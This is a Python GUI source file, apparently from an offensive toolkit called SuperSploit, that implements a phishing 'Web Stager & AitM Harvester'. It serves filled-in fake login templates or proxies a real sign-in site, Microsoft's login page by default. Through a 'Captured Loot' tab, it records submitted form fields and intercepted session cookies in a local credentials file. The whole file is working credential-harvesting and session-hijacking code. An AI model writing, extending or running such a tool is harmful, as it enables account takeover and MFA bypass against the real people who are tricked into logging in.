import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import os
import re
import threading
import http.server
import socketserver
import time
from pathlib import Path
import urllib.parse

# Placeholder for framework database integration
try:
    from source.core.database import DatabaseManagment
    from source.core.license_manager import LicenseManager
    framework_db = DatabaseManagment.get()
except ImportError:
    # Handle if run as standalone script - try to find the framework root
    import sys
    # web_stager_gui.py is in source/tools/Web/
    framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
    if framework_root not in sys.path:
        sys.path.append(framework_root)
    
    try:
        from source.core.database import DatabaseManagment
        from source.core.license_manager import LicenseManager
        framework_db = DatabaseManagment.get()
    except ImportError:
        framework_db = {}
        class LicenseManager:
            @staticmethod
            def gate_access(f): 
                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
                print("[*] Standalone license validation failed. Please run via the main CLI.")
                return False

class WebTemplateGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit Web Stager & AitM Harvester")
        self.root.geometry("1000x950")
        self.root.configure(bg="#f0f0f0")

        self.style = ttk.Style()
        self.style.theme_use('clam')

        self.template_dir = os.path.join(os.getenv("HOME"), ".SuperSploit", "templates", "web")
        self.loot_file = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", ".loot", "captured_creds.txt")
        self._ensure_loot_dir()
        
        self.active_template_path = ""
        self.placeholders = {}
        self.server_thread = None
        self.httpd = None

        self._build_ui()
        self._refresh_templates()
        self._refresh_loot()

    def _ensure_loot_dir(self):
        loot_dir = os.path.dirname(self.loot_file)
        if not os.path.exists(loot_dir):
            os.makedirs(loot_dir)

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        self.main_tabs = ttk.Notebook(main_frame)
        self.main_tabs.pack(fill=tk.BOTH, expand=True)

        # --- TAB 1: STAGING & CONFIG ---
        self.tab_staging = ttk.Frame(self.main_tabs, padding="10")
        self.main_tabs.add(self.tab_staging, text=" 🏗️ Staging & Server ")

        # Mode Selection
        mode_frame = ttk.LabelFrame(self.tab_staging, text=" ⚙️ Operation Mode ", padding="10")
        mode_frame.pack(fill=tk.X, pady=5)
        self.op_mode = tk.StringVar(value="Static")
        ttk.Radiobutton(mode_frame, text="Static Template", variable=self.op_mode, value="Static", command=self._on_mode_change).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(mode_frame, text="AitM Proxy (Live Intercept)", variable=self.op_mode, value="AitM", command=self._on_mode_change).pack(side=tk.LEFT, padx=10)

        # Template Selection (Static Mode)
        self.static_frame = ttk.LabelFrame(self.tab_staging, text=" 📂 Template Selection ", padding="10")
        self.static_frame.pack(fill=tk.X, pady=5)
        ttk.Label(self.static_frame, text="Select Template:").pack(side=tk.LEFT, padx=5)
        self.template_var = tk.StringVar()
        self.template_combo = ttk.Combobox(self.static_frame, textvariable=self.template_var, width=40, state="readonly")
        self.template_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.template_combo.bind("<<ComboboxSelected>>", self._on_template_selected)
        ttk.Button(self.static_frame, text="🔄 Refresh", command=self._refresh_templates).pack(side=tk.LEFT, padx=5)

        # Target URL (AitM Mode)
        self.aitm_frame = ttk.Frame(self.tab_staging)
        self.aitm_label_frame = ttk.LabelFrame(self.aitm_frame, text=" 🎯 Proxy Target (AitM) ", padding="10")
        self.aitm_label_frame.pack(fill=tk.X, pady=5)
        self.target_url = tk.StringVar(value="https://login.microsoftonline.com")
        ttk.Label(self.aitm_label_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(self.aitm_label_frame, textvariable=self.target_url, width=50).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        # Variables & Preview
        paned = ttk.PanedWindow(self.tab_staging, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, pady=10)

        self.var_container = ttk.LabelFrame(paned, text=" ✍️ Variable Injection ", padding="10")
        paned.add(self.var_container, weight=1)
        self.var_canvas = tk.Canvas(self.var_container)
        self.scroll_frame = ttk.Frame(self.var_canvas)
        self.var_canvas.create_window((0, 0), window=self.scroll_frame, anchor="nw")
        self.var_canvas.pack(side="left", fill="both", expand=True)

        preview_frame = ttk.LabelFrame(paned, text=" 👁️ Source Preview ", padding="10")
        paned.add(preview_frame, weight=2)
        self.preview_text = scrolledtext.ScrolledText(preview_frame, font=("Courier", 10), bg="#2b2b2b", fg="#a9b7c6")
        self.preview_text.pack(fill=tk.BOTH, expand=True)

        # Server Control
        server_frame = ttk.LabelFrame(self.tab_staging, text=" 🌐 Server Control ", padding="10")
        server_frame.pack(fill=tk.X, pady=5)
        ttk.Label(server_frame, text="Host:").grid(row=0, column=0, padx=5)
        self.host_entry = ttk.Entry(server_frame, width=15); self.host_entry.insert(0, "0.0.0.0"); self.host_entry.grid(row=0, column=1)
        ttk.Label(server_frame, text="Port:").grid(row=0, column=2, padx=5)
        self.port_entry = ttk.Entry(server_frame, width=8); self.port_entry.insert(0, "8888"); self.port_entry.grid(row=0, column=3)
        self.start_btn = ttk.Button(server_frame, text="🚀 START SERVER", command=self._toggle_server); self.start_btn.grid(row=0, column=4, padx=10)
        self.status_label = ttk.Label(server_frame, text="Offline", foreground="red"); self.status_label.grid(row=0, column=5)

        # --- TAB 2: CAPTURED LOOT ---
        self.tab_loot = ttk.Frame(self.main_tabs, padding="10")
        self.main_tabs.add(self.tab_loot, text=" 📥 Captured Loot ")

        loot_header = ttk.Frame(self.tab_loot)
        loot_header.pack(fill=tk.X, pady=5)
        ttk.Label(loot_header, text="Real-time Credential/Session Harvesting:").pack(side=tk.LEFT)
        ttk.Button(loot_header, text="🔄 Refresh Loot", command=self._refresh_loot).pack(side=tk.RIGHT, padx=5)
        ttk.Button(loot_header, text="🧹 Clear Loot File", command=self._clear_loot).pack(side=tk.RIGHT)

        self.loot_display = scrolledtext.ScrolledText(self.tab_loot, bg="black", fg="#00FF00", font=("Courier", 10))
        self.loot_display.pack(fill=tk.BOTH, expand=True)

    def _on_mode_change(self):
        if self.op_mode.get() == "Static":
            self.aitm_frame.pack_forget()
            self.static_frame.pack(before=self.var_container.master, fill=tk.X, pady=5)
            self.preview_text.config(state=tk.NORMAL)
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, "[*] Select a template to preview...")
        else:
            self.static_frame.pack_forget()
            self.aitm_frame.pack(before=self.var_container.master, fill=tk.X, pady=5)
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, f"[*] AitM Mode Active.\n[*] Traffic will be proxied to: {self.target_url.get()}\n[*] POST data and cookies will be intercepted.")

    def _refresh_templates(self):
        if not os.path.exists(self.template_dir):
            os.makedirs(self.template_dir)
        templates = [f for f in os.listdir(self.template_dir) if f.endswith(".html")]
        self.template_combo['values'] = templates
        if templates:
            self.template_combo.current(0)
            self._on_template_selected(None)

    def _on_template_selected(self, event):
        template_name = self.template_var.get()
        self.active_template_path = os.path.join(self.template_dir, template_name)
        with open(self.active_template_path, 'r') as f: content = f.read()
        self.preview_text.delete(1.0, tk.END); self.preview_text.insert(tk.END, content)
        found = re.findall(r'{{(.*?)}}', content)
        unique_placeholders = sorted(list(set(found)))
        for widget in self.scroll_frame.winfo_children(): widget.destroy()
        self.placeholders = {}
        for i, ph in enumerate(unique_placeholders):
            ttk.Label(self.scroll_frame, text=f"{ph}:").grid(row=i, column=0, sticky=tk.W, pady=2)
            entry = ttk.Entry(self.scroll_frame, width=30)
            val = framework_db.get(ph, "")
            if not val and ph == "LHOST": val = "127.0.0.1"
            if not val and ph == "LPORT": val = "5000"
            entry.insert(0, val); entry.grid(row=i, column=1, padx=10, pady=2)
            self.placeholders[ph] = entry

    def _generate_rendered_content(self):
        if not self.active_template_path: return ""
        with open(self.active_template_path, 'r') as f: content = f.read()
        for ph, entry in self.placeholders.items():
            content = content.replace(f"{{{{{ph}}}}}", entry.get())
        return content

    def _refresh_loot(self):
        self.loot_display.delete(1.0, tk.END)
        if os.path.exists(self.loot_file):
            with open(self.loot_file, "r") as f: self.loot_display.insert(tk.END, f.read())
        self.loot_display.see(tk.END)

    def _clear_loot(self):
        if messagebox.askyesno("Confirm", "Wipe captured credentials?"):
            with open(self.loot_file, "w") as f: f.write("")
            self._refresh_loot()

    def _log_loot(self, client_addr, data):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] IP: {client_addr}\n"
        for k, v in data.items(): entry += f"  {k:<15}: {v}\n"
        entry += "-"*40 + "\n"
        with open(self.loot_file, "a") as f: f.write(entry)
        self.root.after(0, self._refresh_loot)

    def _toggle_server(self):
        if self.server_thread and self.server_thread.is_alive():
            if self.httpd: self.httpd.shutdown(); self.httpd.server_close()
            self.status_label.config(text="Offline", foreground="red"); self.start_btn.config(text="🚀 START SERVER")
        else:
            self._start_server()

    def _start_server(self):
        import requests
        host = self.host_entry.get(); port = int(self.port_entry.get())
        mode = self.op_mode.get(); target = self.target_url.get().rstrip('/')
        
        # PRO GATE: Check license for AitM mode
        if mode == "AitM":
            if not LicenseManager.gate_access("AitM Proxy"):
                return

        staged_html = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "staged_web.html")
        if mode == "Static":
            with open(staged_html, "w") as f: f.write(self._generate_rendered_content())

        outer_self = self
        class StagedHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if mode == "Static":
                    self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
                    with open(staged_html, 'rb') as f: self.wfile.write(f.read())
                else:
                    try:
                        resp = requests.get(f"{target}{self.path}", verify=False)
                        self.send_response(resp.status_code)
                        for k, v in resp.headers.items():
                            if k.lower() not in ['content-encoding', 'transfer-encoding', 'content-length', 'set-cookie']:
                                self.send_header(k, v)
                        if 'Set-Cookie' in resp.headers:
                            outer_self._log_loot(self.client_address[0], {"CAPTURED_COOKIES": resp.headers['Set-Cookie']})
                        self.end_headers()
                        content = resp.content.decode('utf-8', errors='ignore')
                        content = content.replace(target, f"http://{self.headers['Host']}")
                        self.wfile.write(content.encode())
                    except Exception as e: self.send_error(500, str(e))
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                parsed_data = urllib.parse.parse_qs(post_data)
                cleaned_data = {k: v[0] for k, v in parsed_data.items()}
                outer_self._log_loot(self.client_address[0], cleaned_data)
                
                if mode == "Static":
                    self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
                    self.wfile.write(b"<html><body><h1>Processing Security Request...</h1><p>Identity verified. You will be redirected shortly.</p></body></html>")
                else:
                    try:
                        resp = requests.post(f"{target}{self.path}", data=cleaned_data, verify=False)
                        self.send_response(resp.status_code)
                        for k, v in resp.headers.items():
                            if k.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']: self.send_header(k, v)
                        self.end_headers(); self.wfile.write(resp.content)
                    except Exception as e: self.send_error(500, str(e))
            
            def log_message(self, format, *args): return

        try:
            self.httpd = socketserver.TCPServer((host, port), StagedHandler)
            self.server_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            self.server_thread.start()
            self.status_label.config(text="Online", foreground="green"); self.start_btn.config(text="🛑 STOP SERVER")
            messagebox.showinfo("Success", f"Server active at http://{host}:{port}/")
        except Exception as e: messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    root = tk.Tk()
    app = WebTemplateGUI(root)
    root.mainloop()
